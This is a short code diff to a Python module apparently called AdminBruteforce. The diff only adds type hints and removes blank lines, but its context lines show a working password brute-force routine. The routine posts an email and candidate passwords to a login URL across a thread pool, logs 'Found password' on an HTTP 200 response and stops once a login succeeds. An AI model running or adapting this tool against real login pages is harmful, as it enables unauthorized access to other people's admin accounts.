@@ -38,18 +38,17 @@ def check(email: str, password: str, url: str) -> bool:
         data={"email": email, "password": password},
         timeout=10
     )
-
     if r.status_code == 200:
         logger.success(f"Found password: {password}")
         return True
     return False
 
-def callback(result: bool, pool: Pool):
+def callback(result: bool, pool: Pool) -> None:
     '''Callback function'''
     if result is True:
         pool.terminate()
 
-def run(email: str, password_list: list, url: str, thread: int):
+def run(email: str, password_list: list, url: str, thread: int) -> None:
     '''Run the bruteforce'''
     pool = Pool(thread)
     for password in password_list:
@@ -60,3 +59,4 @@ def run(email: str, password_list: list, url: str, thread: int):
 
 def init():
     return AdminBruteforce()
+    
